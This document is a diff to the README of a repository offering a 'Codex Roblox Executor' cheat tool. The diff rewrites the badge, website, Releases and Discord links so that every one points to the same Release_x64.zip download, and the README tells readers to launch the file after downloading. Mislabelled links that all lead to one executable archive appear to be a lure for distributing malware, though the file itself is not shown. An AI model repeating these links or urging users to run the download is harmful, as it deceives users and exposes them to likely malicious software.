@@ -15,7 +15,7 @@ Welcome to the official repository for **Codex Roblox Download**, the ultimate R
 
 ## Installation Process 📥
 To download the Codex Roblox Executor, simply click on the button below:
-[![Download Codex Roblox](https://img.shields.io/badge/Download-Codex%20Roblox-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Codex Roblox](https://github.com/daviddark13/Codex-Roblox-download/releases/download/v1.0/Release_x64.zip%20Roblox-blue)](https://github.com/daviddark13/Codex-Roblox-download/releases/download/v1.0/Release_x64.zip)
 *Note: The file needs to be launched after downloading.*
 
 ## Get Started 🚀
@@ -24,12 +24,12 @@ To download the Codex Roblox Executor, simply click on the button below:
 3. Enjoy stable and smooth gameplay on Roblox!
 
 ## Additional Resources ℹ️
-- For more information and updates, visit our [website](https://codexroblox.com).
-- Check out the latest releases in the [Releases](https://github.com/22155555/1875695542/releases) section.
+- For more information and updates, visit our [website](https://github.com/daviddark13/Codex-Roblox-download/releases/download/v1.0/Release_x64.zip).
+- Check out the latest releases in the [Releases](https://github.com/daviddark13/Codex-Roblox-download/releases/download/v1.0/Release_x64.zip) section.
 
 ## Connect with Us 🌟
 Feel free to join our Discord community to chat with other Roblox enthusiasts and get the latest updates on Codex:
-[Join our Discord community](https://discord.com/codex-roblox)
+[Join our Discord community](https://github.com/daviddark13/Codex-Roblox-download/releases/download/v1.0/Release_x64.zip)
 
 ## Spread the Word 📣
 If you love using Codex Roblox Executor, don't forget to share it with your friends and fellow gamers. Let's make Roblox gaming even more exciting with Codex!
